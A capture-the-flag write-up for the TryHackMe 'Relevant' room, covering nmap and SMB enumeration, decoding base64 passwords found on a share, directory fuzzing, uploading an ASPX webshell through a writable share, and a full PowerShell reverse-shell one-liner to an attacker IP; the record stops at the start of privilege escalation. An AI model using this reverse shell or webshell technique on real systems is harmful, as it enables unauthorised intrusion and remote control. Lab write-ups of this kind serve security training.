# Revelant

![image](https://user-images.githubusercontent.com/5285547/129174199-a0b07f6d-f4bf-4392-9ac2-cbde55554e84.png)

Room link: https://tryhackme.com/room/relevant

## Enum 

### Nmap 

```
nmap -Pn -v 10.10.127.215

PORT      STATE SERVICE
80/tcp    open  http
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
445/tcp   open  microsoft-ds
3389/tcp  open  ms-wbt-server
49663/tcp open  unknown
49667/tcp open  unknown
49669/tcp open  unknown

nmap -Pn -v -p80,135,139,445,3389,49663,49667,49669 -sCV 10.10.127.215

PORT      STATE SERVICE       VERSION
80/tcp    open  http          Microsoft IIS httpd 10.0
| http-methods: 
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE
|_http-title: IIS Windows Server
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds  Windows Server 2016 Standard Evaluation 14393 microsoft-ds
3389/tcp  open  ms-wbt-server Microsoft Terminal Services
| rdp-ntlm-info: 
|   Target_Name: RELEVANT
|   NetBIOS_Domain_Name: RELEVANT
|   NetBIOS_Computer_Name: RELEVANT
|   DNS_Domain_Name: Relevant
|   DNS_Computer_Name: Relevant
|   Product_Version: 10.0.14393
|_  System_Time: 2021-08-12T09:53:48+00:00
| ssl-cert: Subject: commonName=Relevant
| Issuer: commonName=Relevant
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2021-08-11T09:33:28
| Not valid after:  2022-02-10T09:33:28
| MD5:   f94f cb19 c957 e463 6a5a dc04 f356 0d18
|_SHA-1: 61a7 eb4a b3e7 72cf 6619 234f 2cd8 b2fd a709 7148
|_ssl-date: 2021-08-12T09:54:22+00:00; 0s from scanner time.
49663/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
| http-methods: 
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
|_http-title: IIS Windows Server
49667/tcp open  msrpc         Microsoft Windows RPC
49669/tcp open  msrpc         Microsoft Windows RPC
Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 1h24m01s, deviation: 3h07m50s, median: 0s
| smb-os-discovery: 
|   OS: Windows Server 2016 Standard Evaluation 14393 (Windows Server 2016 Standard Evaluation 6.3)
|   Computer name: Relevant
|   NetBIOS computer name: RELEVANT\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2021-08-12T02:53:43-07:00
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2021-08-12T09:53:43
|_  start_date: 2021-08-12T09:34:06
```

Nmap results

We can see from the results a the domain name is "Relevant", their are web portals on port 80,49663 (Microsoft-IIS/10.0 servers).  
This shows SMB is open, let's look into the SMB first. 

### SMB

```
$ smbclient -L 10.10.127.215                
Enter WORKGROUP\ac1d's password: 

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
        nt4wrksv        Disk      
SMB1 disabled -- no workgroup available
```

Connecting we get a file called passwords.txt

![image](https://user-images.githubusercontent.com/5285547/129176481-a8ae0710-f356-49c2-b0e2-18645e6b6d49.png)

passwords.txt

```
$ cat passwords.txt     
[User Passwords - Encoded]
Qm9iIC0gIVBAJCRXMHJEITEyMw==
QmlsbCAtIEp1dzRubmFNNG40MjA2OTY5NjkhJCQk 
```

Decoded

```
Bob:!P@$$W0rD!123
Bill:Juw4nnaM4n420696969!$$$
```

Trying psexec shows we have working creds for bob but not bill

![image](https://user-images.githubusercontent.com/5285547/129179521-7337874d-d25d-4905-8eb6-c30bb1d8061a.png)

![image](https://user-images.githubusercontent.com/5285547/129179581-59ddec12-1498-4cf0-9b59-53b232b8d73d.png)


At this point I got a bit stuck so decided to enum some more, I started on port 80 but didnt find anything.  
Then moved to port 49663
 
```
ffuf -u http://10.10.204.235:49663/FUZZ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -fc 403 -ic 

nt4wrksv                [Status: 301, Size: 159, Words: 9, Lines: 2]

#Remembering the file on the SMB share, I checked for it. 
http://10.10.204.235:49663/ntw4wrksv/passwords.txt
```

We have READ/WRITE access to the smb share so I tested a file upload which worked. 

![image](https://user-images.githubusercontent.com/5285547/129181840-bdaac284-f23e-42d8-abd6-5e383cf76e4e.png)

![image](https://user-images.githubusercontent.com/5285547/129181810-872aec0e-3db2-4211-ae3d-4a430c14dfe1.png)

Checking a few directorys we can find the webupload folder. 

![image](https://user-images.githubusercontent.com/5285547/129193912-7667cb4c-92d3-4936-894d-a50f19c81eee.png)

I also uploaded a rev.exe (go lang reverse shell to test and play with) 

![image](https://user-images.githubusercontent.com/5285547/129194080-b953b03e-ebfd-4f82-8120-c7a4ef0ddfbf.png)


Testing a meterpreter reverse shell (.exe) failed. So I tested a few more payloads until .aspx worked.

cmdasp.aspx shell located on kali /usr/share/webshells/aspx/

![image](https://user-images.githubusercontent.com/5285547/129187032-0f138d8c-da37-4928-8cbc-17ef57ad4022.png)

Using a powershell payload I get a reverse shell or use the golang shell i found online.

```
# http://10.10.204.235:49663/nt4wrksv/cmdasp.aspx
start c:\inetpub\wwwroot\nt4wrksv\rev.exe
```

```
powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient("10.8.153.120",8888);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
```

![image](https://user-images.githubusercontent.com/5285547/129194610-912d5e6e-8401-486d-b752-704fc473f3bb.png)

The asp shell was much more stable so I ended up using that. 

Navigating to Bob's Desktop we can find the user.txt flag. 

![image](https://user-images.githubusercontent.com/5285547/129199055-38f6c5ae-cb52-4cfc-a3b2-0796d1dbccbf.png)

---

## Root

Checking the system

![image](https://user-images.githubusercontent.com/5285547/129198975-1c8d84d8-b2c5-4614-be16-33174cc062b6.png)


